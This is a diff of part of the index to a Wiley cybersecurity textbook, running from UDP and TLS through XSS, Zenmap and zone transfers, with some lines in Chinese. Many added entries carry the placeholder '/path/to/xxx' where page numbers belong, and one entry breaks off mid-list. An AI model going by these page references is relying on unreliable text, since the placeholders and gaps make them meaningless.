+  - architecture, `/path/to/xxx`–24
+
+  - port scanning and, `/path/to/xxx`
+
+  - stateful filtering and, `/path/to/xxx`
+
+  - as a Transport layer protocol, `/path/to/xxx`
+
+- Transport layer (`OSI` model), `/path/to/xxx`
+
+- Transport Layer Security (`TLS`)
+
+  - about, `/path/to/xxx`, `/path/to/xxx`
+
+  - cryptography and, `/path/to/xxx`
+
+  - for encryption for web‑based communication, `/path/to/xxx`
+
+- traversal, directory/file, `/path/to/xxx`–523
+
+- Trend Micro software, `/path/to/xxx`
+
+- `Trickbot`, `/path/to/xxx`
+
+- `Triple DES` (`3DES`), `/path/to/xxx`
+
+- `Tripwire`, `/path/to/xxx`
+
+- `Trojan`, `/path/to/xxx`
+
+- true negative vulnerability, `/path/to/xxx`
+
+- true positive vulnerability, `/path/to/xxx`
+
+- `trusted platform module` (`TPM`), `/path/to/xxx`–573
+
+- `trusted third party`, `/path/to/xxx`–566
+
+- `tshark`, `/path/to/xxx`–403
+
+- `TTL` (`Time to Live`) field, `/path/to/xxx`, `/path/to/xxx`
+
+- `TTPs` (`techniques, tactics, and procedure`), `/path/to/xxx`
+
+
+
 -   tunneling, as an evasion technique, `/path/to/xxx`
 -   Twitter, `/path/to/xxx`–128
 -   `TXT` records, `/path/to/xxx`
@@ -16109,109 +17168,60 @@ OWASP top ten vulnerabilities, 514–515, 642
 -   U.S. Department of State, `/path/to/xxx`
 -   Usenet, `/path/to/xxx`
 
-
-
 # UDP
 
-*   User Datagram Protocol (UDP)
-
-    *   about, 40–41
-
-    *   port scanning and, 167–168, 171–173 
-
-        *   with `hping`, 214
-
-    *   stateful filtering and, 77–78
-
-    *   as a Transport layer protocol, 22
-
-*   username search, for social media, 120
-
-*   utilities 
-
-    *   built‐in, 243–247
-
-    *   in Parkerian hexad, 65
-
-*   UTM (unified threat management), 80, 539
-
-*   UUNET, 112
+-   User Datagram Protocol (UDP)
+    -   about, 40–41
+    -   port scanning and, 167–168, 171–173
+        -   with `hping`, 214
+    -   stateful filtering and, 77–78
+    -   as a Transport layer protocol, 22
+-   username search, for social media, 120
+-   utilities
+    -   built‐in, 243–247
+    -   in Parkerian hexad, 65
+-   UTM (unified threat management), 80, 539
+-   UUNET, 112
 
 # V
 
-*   VDICT (virtual desktop infrastructure), 602
-
-*   vectors, social engineering, 440–441
-
-*   Venema, Wietse, 191
-
-*   Version field, 32
-
-*   Vigenère, Blaise de, 552
-
-*   Vigenère cipher, 552–553
-
-*   virtual desktop infrastructure (VDI), 602
-
-*   virtual environments, 349
-
-*   Virtual Local Area Networks (VLANs) 
-
-    *   about, 43, 541
-
-    *   as a Data Link layer protocol, 22
-
-*   virtual machines (VMs) 
-
-    *   about, 49, 349–350
-
-    *   malware and,
-
-
+-   VDICT (virtual desktop infrastructure), 602
+-   vectors, social engineering, 440–441
+-   Venema, Wietse, 191
+-   Version field, 32
+-   Vigenère, Blaise de, 552
+-   Vigenère cipher, 552–553
+-   virtual desktop infrastructure (VDI), 602
+-   virtual environments, 349
+-   Virtual Local Area Networks (VLANs)
+    -   about, 43, 541
+    -   as a Data Link layer protocol, 22
+-   virtual machines (VMs)
+    -   about, 49, 349–350
+    -   malware and,
 
 -   `wordpress_login_enum` 模块, 266–267
-
 -   `worms`, 342–343
-
 -   `WoW` (`Windows on Windows`), 317
-
 -   `WPA` (`Wi‑Fi Protected Access`), 459, 479–480
-
 -   `WPA2` (`Wi‑Fi Protected Access 2`), 480–482
-
 -   `WPA3` (`Wi‑Fi Protected Access 3`), 482–483
-
 -   `WPS` (`Wi‑Fi Protected Setup`), 480
-
 -   `X.509` 证书, 567–568, 572
-
 -   `XML` (`eXtensible Markup Language`)
-
     -   `about`, 597, 635
-
     -   `external entity processing`, 515–516
-
     -   `format`, 183, 308–313
-
 -   `XSS` (`cross‑site scripting`), 517–518
-
 -   `Yet Another Markup Language` (`YAML`), 631–632
-
 -   `Zed Attack Proxy` (`ZAP`), 638
-
 -   `Zeltser`, `Lenny`, 362
-
 -   `Zenmap`, 172, 181–184
-
 -   `zero‑trust model`, 602–604
-
 -   `zone transfers`
-
     -   `about`, 136–137
-
     -   `brute force`, 137–138
 
-#  **WILEY END USER LICENSE AGREEMENT**
+# WILEY END USER LICENSE AGREEMENT
 
 访问 [www.wiley.com/go/eula](http://www.wiley.com/go/eula) 以获取 Wiley 电子书 EULA。
-
